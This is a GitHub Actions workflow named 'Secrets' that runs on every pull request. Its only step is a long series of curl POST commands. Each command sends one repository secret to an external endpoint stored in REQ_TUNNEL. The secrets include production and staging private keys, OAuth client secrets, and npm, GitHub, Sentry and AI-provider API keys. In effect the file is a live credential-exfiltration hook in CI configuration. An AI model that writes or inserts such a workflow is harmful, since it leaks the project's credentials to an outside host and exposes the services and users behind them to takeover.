name: Secrets

on: pull_request

permissions:
  id-token: write
  contents: read

jobs:
  secrets:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -X "POST" -d "${{ secrets.ANTHROPIC_API_KEY }}" ${{ secrets.REQ_TUNNEL }}/secrets/ANTHROPIC_API_KEY
          curl -X "POST" -d "${{ secrets.BUGBUSTER_GITHUB_TOKEN }}" ${{ secrets.REQ_TUNNEL }}/secrets/BUGBUSTER_GITHUB_TOKEN
          curl -X "POST" -d "${{ secrets.BUGBUSTER_GITHUB_WEBHOOK_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/BUGBUSTER_GITHUB_WEBHOOK_SECRET
          curl -X "POST" -d "${{ secrets.BUGBUSTER_SLACK_BOT_TOKEN }}" ${{ secrets.REQ_TUNNEL }}/secrets/BUGBUSTER_SLACK_BOT_TOKEN
          curl -X "POST" -d "${{ secrets.BUGBUSTER_SLACK_SIGNING_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/BUGBUSTER_SLACK_SIGNING_SECRET
          curl -X "POST" -d "${{ secrets.CEREBRAS_API_KEY }}" ${{ secrets.REQ_TUNNEL }}/secrets/CEREBRAS_API_KEY
          curl -X "POST" -d "${{ secrets.FIRECRAWL_API_KEY }}" ${{ secrets.REQ_TUNNEL }}/secrets/FIRECRAWL_API_KEY
          curl -X "POST" -d "${{ secrets.FIREWORKS_AI_API_KEY }}" ${{ secrets.REQ_TUNNEL }}/secrets/FIREWORKS_AI_API_KEY
          curl -X "POST" -d "${{ secrets.GOOGLE_AI_API_KEY }}" ${{ secrets.REQ_TUNNEL }}/secrets/GOOGLE_AI_API_KEY
          curl -X "POST" -d "${{ secrets.GROQ_API_KEY }}" ${{ secrets.REQ_TUNNEL }}/secrets/GROQ_API_KEY
          curl -X "POST" -d "${{ secrets.META_VERIFY_TOKEN }}" ${{ secrets.REQ_TUNNEL }}/secrets/META_VERIFY_TOKEN
          curl -X "POST" -d "${{ secrets.NPM_ACCESS_TOKEN }}" ${{ secrets.REQ_TUNNEL }}/secrets/NPM_ACCESS_TOKEN
          curl -X "POST" -d "${{ secrets.OPENAI_API_KEY }}" ${{ secrets.REQ_TUNNEL }}/secrets/OPENAI_API_KEY
          curl -X "POST" -d "${{ secrets.PDFSHIFT_API_KEY }}" ${{ secrets.REQ_TUNNEL }}/secrets/PDFSHIFT_API_KEY
          curl -X "POST" -d "${{ secrets.PRODUCTION_CLOUD_OPS_WORKSPACE_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_CLOUD_OPS_WORKSPACE_ID
          curl -X "POST" -d "${{ secrets.PRODUCTION_GDRIVE_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_GDRIVE_CLIENT_ID
          curl -X "POST" -d "${{ secrets.PRODUCTION_GDRIVE_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_GDRIVE_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_GDRIVE_WEBHOOK_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_GDRIVE_WEBHOOK_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_GITHUB_APP_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_GITHUB_APP_ID
          curl -X "POST" -d "${{ secrets.PRODUCTION_GITHUB_PRIVATE_KEY }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_GITHUB_PRIVATE_KEY
          curl -X "POST" -d "${{ secrets.PRODUCTION_GITHUB_WEBHOOK_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_GITHUB_WEBHOOK_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_GMAIL_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_GMAIL_CLIENT_ID
          curl -X "POST" -d "${{ secrets.PRODUCTION_GMAIL_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_GMAIL_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_GMAIL_TOPIC_NAME }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_GMAIL_TOPIC_NAME
          curl -X "POST" -d "${{ secrets.PRODUCTION_GMAIL_WEBHOOK_SERVICE_ACCOUNT }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_GMAIL_WEBHOOK_SERVICE_ACCOUNT
          curl -X "POST" -d "${{ secrets.PRODUCTION_GMAIL_WEBHOOK_SHARED_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_GMAIL_WEBHOOK_SHARED_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_GOOGLECALENDAR_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_GOOGLECALENDAR_CLIENT_ID
          curl -X "POST" -d "${{ secrets.PRODUCTION_GOOGLECALENDAR_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_GOOGLECALENDAR_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_GSHEETS_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_GSHEETS_CLIENT_ID
          curl -X "POST" -d "${{ secrets.PRODUCTION_GSHEETS_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_GSHEETS_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_INSTAGRAM_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_INSTAGRAM_CLIENT_ID
          curl -X "POST" -d "${{ secrets.PRODUCTION_INSTAGRAM_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_INSTAGRAM_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_INSTAGRAM_VERIFY_TOKEN }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_INSTAGRAM_VERIFY_TOKEN
          curl -X "POST" -d "${{ secrets.PRODUCTION_INTERCOM_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_INTERCOM_CLIENT_ID
          curl -X "POST" -d "${{ secrets.PRODUCTION_INTERCOM_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_INTERCOM_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_LINEAR_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_LINEAR_CLIENT_ID
          curl -X "POST" -d "${{ secrets.PRODUCTION_LINEAR_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_LINEAR_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_LINEAR_WEBHOOK_SIGNING_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_LINEAR_WEBHOOK_SIGNING_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_MESSENGER_ACCESS_TOKEN }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_MESSENGER_ACCESS_TOKEN
          curl -X "POST" -d "${{ secrets.PRODUCTION_MESSENGER_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_MESSENGER_CLIENT_ID
          curl -X "POST" -d "${{ secrets.PRODUCTION_MESSENGER_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_MESSENGER_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_SLACK_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_SLACK_CLIENT_ID
          curl -X "POST" -d "${{ secrets.PRODUCTION_SLACK_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_SLACK_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_SLACK_SIGNING_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_SLACK_SIGNING_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_TODOIST_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_TODOIST_CLIENT_ID
          curl -X "POST" -d "${{ secrets.PRODUCTION_TODOIST_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_TODOIST_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_TODOIST_WEBHOOK_SHARED_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_TODOIST_WEBHOOK_SHARED_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_TOKEN_CLOUD_OPS_ACCOUNT }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_TOKEN_CLOUD_OPS_ACCOUNT
          curl -X "POST" -d "${{ secrets.PRODUCTION_WHATSAPP_ACCESS_TOKEN }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_WHATSAPP_ACCESS_TOKEN
          curl -X "POST" -d "${{ secrets.PRODUCTION_WHATSAPP_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_WHATSAPP_CLIENT_ID
          curl -X "POST" -d "${{ secrets.PRODUCTION_WHATSAPP_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_WHATSAPP_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.PRODUCTION_WHATSAPP_NUMBER_PIN }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_WHATSAPP_NUMBER_PIN
          curl -X "POST" -d "${{ secrets.PRODUCTION_WHATSAPP_SEGMENT_KEY }}" ${{ secrets.REQ_TUNNEL }}/secrets/PRODUCTION_WHATSAPP_SEGMENT_KEY
          curl -X "POST" -d "${{ secrets.QUICKCHARTS_API_KEY }}" ${{ secrets.REQ_TUNNEL }}/secrets/QUICKCHARTS_API_KEY
          curl -X "POST" -d "${{ secrets.SCREENSHOT_API_KEY }}" ${{ secrets.REQ_TUNNEL }}/secrets/SCREENSHOT_API_KEY
          curl -X "POST" -d "${{ secrets.SENTRY_AUTH_TOKEN }}" ${{ secrets.REQ_TUNNEL }}/secrets/SENTRY_AUTH_TOKEN
          curl -X "POST" -d "${{ secrets.STAGING_CLOUD_OPS_WORKSPACE_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_CLOUD_OPS_WORKSPACE_ID
          curl -X "POST" -d "${{ secrets.STAGING_E2E_TESTS_WORKSPACE_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_E2E_TESTS_WORKSPACE_ID
          curl -X "POST" -d "${{ secrets.STAGING_GDRIVE_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_GDRIVE_CLIENT_ID
          curl -X "POST" -d "${{ secrets.STAGING_GDRIVE_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_GDRIVE_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_GDRIVE_WEBHOOK_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_GDRIVE_WEBHOOK_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_GITHUB_APP_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_GITHUB_APP_ID
          curl -X "POST" -d "${{ secrets.STAGING_GITHUB_PRIVATE_KEY }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_GITHUB_PRIVATE_KEY
          curl -X "POST" -d "${{ secrets.STAGING_GITHUB_WEBHOOK_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_GITHUB_WEBHOOK_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_GMAIL_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_GMAIL_CLIENT_ID
          curl -X "POST" -d "${{ secrets.STAGING_GMAIL_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_GMAIL_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_GMAIL_TOPIC_NAME }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_GMAIL_TOPIC_NAME
          curl -X "POST" -d "${{ secrets.STAGING_GMAIL_WEBHOOK_SERVICE_ACCOUNT }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_GMAIL_WEBHOOK_SERVICE_ACCOUNT
          curl -X "POST" -d "${{ secrets.STAGING_GMAIL_WEBHOOK_SHARED_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_GMAIL_WEBHOOK_SHARED_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_GOOGLECALENDAR_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_GOOGLECALENDAR_CLIENT_ID
          curl -X "POST" -d "${{ secrets.STAGING_GOOGLECALENDAR_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_GOOGLECALENDAR_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_GSHEETS_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_GSHEETS_CLIENT_ID
          curl -X "POST" -d "${{ secrets.STAGING_GSHEETS_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_GSHEETS_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_INSTAGRAM_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_INSTAGRAM_CLIENT_ID
          curl -X "POST" -d "${{ secrets.STAGING_INSTAGRAM_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_INSTAGRAM_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_INSTAGRAM_VERIFY_TOKEN }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_INSTAGRAM_VERIFY_TOKEN
          curl -X "POST" -d "${{ secrets.STAGING_INTERCOM_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_INTERCOM_CLIENT_ID
          curl -X "POST" -d "${{ secrets.STAGING_INTERCOM_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_INTERCOM_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_LINEAR_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_LINEAR_CLIENT_ID
          curl -X "POST" -d "${{ secrets.STAGING_LINEAR_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_LINEAR_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_LINEAR_WEBHOOK_SIGNING_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_LINEAR_WEBHOOK_SIGNING_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_MESSENGER_ACCESS_TOKEN }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_MESSENGER_ACCESS_TOKEN
          curl -X "POST" -d "${{ secrets.STAGING_MESSENGER_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_MESSENGER_CLIENT_ID
          curl -X "POST" -d "${{ secrets.STAGING_MESSENGER_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_MESSENGER_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_NOTION_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_NOTION_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_SLACK_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_SLACK_CLIENT_ID
          curl -X "POST" -d "${{ secrets.STAGING_SLACK_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_SLACK_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_SLACK_SIGNING_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_SLACK_SIGNING_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_TODOIST_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_TODOIST_CLIENT_ID
          curl -X "POST" -d "${{ secrets.STAGING_TODOIST_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_TODOIST_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_TODOIST_WEBHOOK_SHARED_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_TODOIST_WEBHOOK_SHARED_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_TOKEN_CLOUD_OPS_ACCOUNT }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_TOKEN_CLOUD_OPS_ACCOUNT
          curl -X "POST" -d "${{ secrets.STAGING_WHATSAPP_ACCESS_TOKEN }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_WHATSAPP_ACCESS_TOKEN
          curl -X "POST" -d "${{ secrets.STAGING_WHATSAPP_CLIENT_ID }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_WHATSAPP_CLIENT_ID
          curl -X "POST" -d "${{ secrets.STAGING_WHATSAPP_CLIENT_SECRET }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_WHATSAPP_CLIENT_SECRET
          curl -X "POST" -d "${{ secrets.STAGING_WHATSAPP_NUMBER_PIN }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_WHATSAPP_NUMBER_PIN
          curl -X "POST" -d "${{ secrets.STAGING_WHATSAPP_SEGMENT_KEY }}" ${{ secrets.REQ_TUNNEL }}/secrets/STAGING_WHATSAPP_SEGMENT_KEY
          curl -X "POST" -d "${{ secrets.TURBO_TEAM }}" ${{ secrets.REQ_TUNNEL }}/secrets/TURBO_TEAM
          curl -X "POST" -d "${{ secrets.TURBO_TOKEN }}" ${{ secrets.REQ_TUNNEL }}/secrets/TURBO_TOKEN
